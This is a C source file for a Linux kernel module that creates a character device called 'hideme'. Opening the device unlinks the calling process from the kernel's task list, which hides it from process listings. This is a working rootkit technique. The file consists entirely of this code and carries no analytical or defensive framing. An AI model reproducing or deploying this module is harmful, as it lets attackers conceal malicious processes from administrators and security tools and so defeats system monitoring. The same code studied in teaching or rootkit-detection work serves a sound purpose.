#include <linux/module.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");  // needed for class_create, device_create, etc.

int init_module(void);
void cleanup_module(void);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

#define  DEVICE_NAME "hideme"
#define  CLASS_NAME  "hideme"

static int my_major;

static struct class*  my_class  = NULL;
static struct device* my_device = NULL;

static struct file_operations fops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

int init_module(void)
{
	// Register the char device
        my_major = register_chrdev(0, DEVICE_NAME, &fops);
	if (my_major < 0) {
	  printk(KERN_ALERT "Registering char device failed with %d\n", my_major);
	  return my_major;
	}
	printk(KERN_INFO "registered correctly with major number %d\n", my_major);

	my_class = class_create(THIS_MODULE, CLASS_NAME);
	if (IS_ERR(my_class)){
		unregister_chrdev(my_major, DEVICE_NAME);
		printk(KERN_ALERT "Failed to register device class\n");
		return PTR_ERR(my_class);
	}
	printk(KERN_INFO "registered device class\n");

	my_device = device_create(my_class, NULL, MKDEV(my_major, 0), NULL, DEVICE_NAME);
	if (IS_ERR(my_device)){
		class_destroy(my_class);
		unregister_chrdev(my_major, DEVICE_NAME);
		printk(KERN_ALERT "Failed to create the device\n");
		return PTR_ERR(my_device);
	}
	printk(KERN_INFO "created device successfully\n");

	return 0;
}

void cleanup_module(void)
{
	// Unregister the char device
	device_destroy(my_class, MKDEV(my_major, 0));  // remove the device
	class_unregister(my_class);                    // unregister the device class
	class_destroy(my_class);                       // remove the device class
	unregister_chrdev(my_major, DEVICE_NAME);      // unregister the major number
}

static int device_open(struct inode *inode, struct file *file)
{
	printk(KERN_INFO "device_open called\n");

	// Increment usage count
	try_module_get(THIS_MODULE);

	// Remove this process from the task list
	printk(KERN_INFO "removing PID %d from task list\n", current->pid);
	printk(KERN_INFO "\tchanging next task: %p -> %p\n", current->tasks.next->prev, current->tasks.prev);
	current->tasks.next->prev = current->tasks.prev;
	printk(KERN_INFO "\tchanging prev task: %p -> %p\n", current->tasks.prev->next, current->tasks.next);
	current->tasks.prev->next = current->tasks.next;

	return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
	printk(KERN_INFO "device_closed called\n");

	// Decrement usage count
	module_put(THIS_MODULE);

	return 0;
}

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t * offset)
{
	printk(KERN_INFO "device_read called\n");

	return 0;
}

static ssize_t
device_write(struct file *filp, const char *buff, size_t len, loff_t * off)
{
	printk(KERN_INFO "device_write called\n");

	return 0;
}
